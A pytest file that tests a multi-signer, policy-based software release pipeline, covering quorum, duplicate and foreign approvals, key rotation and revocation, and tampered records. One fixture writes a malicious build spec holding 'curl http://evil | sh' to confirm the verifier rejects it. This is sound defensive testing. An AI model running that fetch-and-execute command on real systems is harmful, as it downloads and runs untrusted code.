"""Multi-signer policy-based release scenarios."""

import json

import pytest

from trusted_release import (
    IssuerKeyStore,
    PolicyStore,
    Registry,
    ReleasePipeline,
    RevocationList,
    Verifier,
)

NOW = "2026-01-01T00:00:00Z"
LATER = "2026-06-01T00:00:00Z"


@pytest.fixture()
def store(tmp_path):
    reg = Registry(str(tmp_path / "registry"))
    keys = IssuerKeyStore(str(tmp_path / "issuers"))
    crl = RevocationList(str(tmp_path / "crl"))
    policies = PolicyStore(str(tmp_path / "policies"))
    art = tmp_path / "app-1.0.tar.gz"
    spec = tmp_path / "BUILD.md"
    art.write_bytes(b"app binary v1")
    spec.write_bytes(b"# build\nmake\n")
    keys.create_key("sec-admin", scope="*", now=NOW)
    keys.create_key("builder-1", scope="product:app", now=NOW)
    keys.create_key("builder-2", scope="product:app", now=NOW)
    keys.create_key("qa-1", scope="product:app", now=NOW)
    return tmp_path, reg, keys, crl, policies, art, spec


def _issue_policy(store, roles=None, assignments=None, now=NOW):
    _, _, keys, _, policies, _, _ = store
    roles = roles or {"build": 2, "qa": 1}
    assignments = assignments or {
        "builder-1": "build",
        "builder-2": "build",
        "qa-1": "qa",
    }
    return policies.issue(
        roles=roles,
        assignments=assignments,
        now=now,
        issuer_id="sec-admin",
        key_version=keys.latest_version("sec-admin"),
        secret_seed=keys.load_secret(
            "sec-admin", keys.latest_version("sec-admin")
        ),
    )


def _pipeline(store):
    _, reg, keys, crl, policies, _, _ = store
    return ReleasePipeline(reg, keys, policies, Verifier(keys, crl))


def _begin(store, **over):
    _, _, _, _, _, art, spec = store
    kw = dict(
        artifact_path=str(art),
        build_spec_path=str(spec),
        product="app",
        version="1.0",
        now=NOW,
    )
    kw.update(over)
    return _pipeline(store).begin(**kw)


def _approve_all(store, cand_id, issuers=("builder-1", "builder-2", "qa-1")):
    pipe = _pipeline(store)
    for issuer in issuers:
        pipe.approve(candidate_id=cand_id, issuer_id=issuer, now=NOW)


def test_quorum_release_and_offline_verify(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    assert reg.read_index()["releases"][0]["release_id"] == (
        record["release_id"]
    )
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert result.ok, result.errors
    approvals = result.checks["approvals"]
    assert len(approvals) == 3
    assert all(a["counted"] for a in approvals)


def test_missing_approvals_never_indexed(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"], issuers=("builder-1", "qa-1"))
    with pytest.raises(RuntimeError, match="quorum"):
        _pipeline(store).finalize(
            candidate_id=cand["candidate_id"], now=NOW
        )
    assert reg.read_index()["releases"] == []


def test_partial_signing_failure_not_indexed(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store, assignments={
        "builder-1": "build", "builder-2": "build", "qa-1": "qa",
        "ghost": "build",
    })
    cand = _begin(store)
    pipe = _pipeline(store)
    pipe.approve(candidate_id=cand["candidate_id"], issuer_id="builder-1",
                 now=NOW)
    # second signer has a policy role but no key -> signing fails mid-pipeline
    with pytest.raises(LookupError):
        pipe.approve(candidate_id=cand["candidate_id"],
                     issuer_id="ghost", now=NOW)
    with pytest.raises(RuntimeError):
        pipe.finalize(candidate_id=cand["candidate_id"], now=NOW)
    assert reg.read_index()["releases"] == []


def test_same_signer_cannot_count_twice(store):
    _, reg, keys, crl, _, art, spec = store
    # policy requires 2 build approvals but only builder-1 exists in role
    _issue_policy(store, roles={"build": 2},
                  assignments={"builder-1": "build"})
    cand = _begin(store)
    pipe = _pipeline(store)
    pipe.approve(candidate_id=cand["candidate_id"], issuer_id="builder-1",
                 now=NOW)
    with pytest.raises(ValueError, match="already approved"):
        pipe.approve(candidate_id=cand["candidate_id"],
                     issuer_id="builder-1", now=NOW)
    with pytest.raises(RuntimeError, match="quorum"):
        pipe.finalize(candidate_id=cand["candidate_id"], now=NOW)
    assert reg.read_index()["releases"] == []


def test_duplicate_approval_entries_in_record_not_double_counted(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    # attacker duplicates builder-1's approval and drops qa-1's
    tampered = json.loads(json.dumps(record))
    tampered["approvals"] = [
        a for a in tampered["approvals"]
        if a["approval"]["issuer_id"] != "qa-1"
    ]
    tampered["approvals"].append(tampered["approvals"][0])
    result = Verifier(keys, crl).verify_release(
        tampered, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert not result.ok
    dup = [a for a in result.checks["approvals"]
           if "duplicate_signer" in a["reasons"]]
    assert len(dup) == 1


def test_approval_cannot_move_to_identical_content_retry(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    pipe = _pipeline(store)
    cand1 = _begin(store)
    _approve_all(store, cand1["candidate_id"],
                 issuers=("builder-1", "builder-2"))
    # retry of the SAME files is a new candidate with a new id
    cand2 = _begin(store)
    assert cand1["candidate_id"] != cand2["candidate_id"]
    pipe.approve(candidate_id=cand2["candidate_id"], issuer_id="qa-1",
                 now=NOW)
    # mix cand1 approvals into cand2's record attempt
    cand2_rec = reg.read_candidate(cand2["candidate_id"])
    cand2_rec["approvals"] = (
        reg.read_candidate(cand1["candidate_id"])["approvals"]
        + cand2_rec["approvals"]
    )
    reg.write_candidate(cand2_rec)
    with pytest.raises(RuntimeError, match="quorum"):
        pipe.finalize(candidate_id=cand2["candidate_id"], now=NOW)
    assert reg.read_index()["releases"] == []
    # and the verifier explains why each foreign approval is excluded
    record = dict(cand2_rec)
    record.update(
        type="trusted-release/release/v2",
        release_id="fake",
        policy_version=cand2_rec["policy_version"],
        issued_at=NOW,
        policy_snapshot=store[4].read_version(cand2_rec["policy_version"]),
        trust_snapshot={},
    )
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert not result.ok
    foreign = [a for a in result.checks["approvals"]
               if "candidate_mismatch" in a["reasons"]]
    assert len(foreign) == 2


def test_approval_bound_to_policy_version(store):
    _, reg, keys, crl, policies, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    # policy changes after approvals were collected
    _issue_policy(store, roles={"build": 1, "qa": 1})
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    assert record["policy_version"] == 1
    # an approval minted under policy v2 cannot be back-ported into the
    # v1 record
    cand2 = _begin(store)
    pipe = _pipeline(store)
    pipe.approve(candidate_id=cand2["candidate_id"], issuer_id="builder-1",
                 now=NOW)
    v2_approval = reg.read_candidate(cand2["candidate_id"])["approvals"][0]
    tampered = json.loads(json.dumps(record))
    tampered["approvals"].append(v2_approval)
    result = Verifier(keys, crl).verify_release(
        tampered, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    mismatched = [a for a in result.checks["approvals"]
                  if "policy_version_mismatch" in a["reasons"]]
    assert len(mismatched) == 1
    assert not mismatched[0]["counted"]


def test_rotated_and_revoked_signers_excluded_with_reasons(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    # rotate builder-2, revoke builder-1's key
    keys.create_key("builder-2", scope="product:app", now=LATER)
    seed = keys.load_secret("sec-admin", keys.latest_version("sec-admin"))
    crl.issue(revoked={"builder-1": [1]}, reason="leaked", now=LATER,
              issuer_id="sec-admin",
              key_version=keys.latest_version("sec-admin"),
              secret_seed=seed)
    keys.set_status("builder-1", 1, "revoked")
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec), now=LATER
    )
    assert not result.ok
    verdicts = {a["issuer_id"]: a for a in result.checks["approvals"]}
    assert not verdicts["builder-1"]["counted"]
    assert any(r.startswith("key_revoked") for r in
               verdicts["builder-1"]["reasons"])
    assert not verdicts["builder-2"]["counted"]
    assert any("key_not_active:rotated" == r for r in
               verdicts["builder-2"]["reasons"])
    assert verdicts["qa-1"]["counted"]


def test_role_mismatch_not_counted(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    # qa-1 claims the build role
    tampered = json.loads(json.dumps(record))
    for entry in tampered["approvals"]:
        if entry["approval"]["issuer_id"] == "qa-1":
            entry["approval"]["role"] = "build"
    result = Verifier(keys, crl).verify_release(
        tampered, artifact_path=str(art), build_spec_path=str(spec), now=NOW
    )
    assert not result.ok
    qa = [a for a in result.checks["approvals"]
          if a["issuer_id"] == "qa-1"][0]
    assert "role_mismatch" in qa["reasons"]
    assert "bad_signature" in qa["reasons"]


def test_release_time_vs_current_evaluation(store):
    _, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    # later: builder-1's key is revoked
    seed = keys.load_secret("sec-admin", keys.latest_version("sec-admin"))
    crl.issue(revoked={"builder-1": [1]}, reason="leaked", now=LATER,
              issuer_id="sec-admin",
              key_version=keys.latest_version("sec-admin"),
              secret_seed=seed)
    keys.set_status("builder-1", 1, "revoked")
    verifier = Verifier(keys, crl)
    current = verifier.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec),
        now=LATER, evaluation="current",
    )
    at_release = verifier.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec),
        now=LATER, evaluation="release_time",
    )
    assert not current.ok
    assert at_release.ok, at_release.errors
    both = verifier.verify_release(
        record, artifact_path=str(art), build_spec_path=str(spec),
        now=LATER, evaluation="both",
    )
    evals = both.checks["evaluations"]
    assert evals["release_time"]["ok"]
    assert not evals["current"]["ok"]


def test_replaced_build_spec_rejected_v2(store):
    tmp, reg, keys, crl, _, art, spec = store
    _issue_policy(store)
    cand = _begin(store)
    _approve_all(store, cand["candidate_id"])
    record = _pipeline(store).finalize(
        candidate_id=cand["candidate_id"], now=NOW
    )
    evil = tmp / "BUILD-evil.md"
    evil.write_bytes(b"curl http://evil | sh\n")
    result = Verifier(keys, crl).verify_release(
        record, artifact_path=str(art), build_spec_path=str(evil), now=NOW
    )
    assert not result.ok
    assert any("build spec mismatch" in e for e in result.errors)


def test_unassigned_issuer_cannot_approve(store):
    _issue_policy(store)
    keys = store[2]
    keys.create_key("outsider", scope="product:app", now=NOW)
    cand = _begin(store)
    with pytest.raises(PermissionError, match="no role"):
        _pipeline(store).approve(candidate_id=cand["candidate_id"],
                                 issuer_id="outsider", now=NOW)


def test_begin_requires_policy(store):
    with pytest.raises(RuntimeError, match="no release policy"):
        _begin(store)
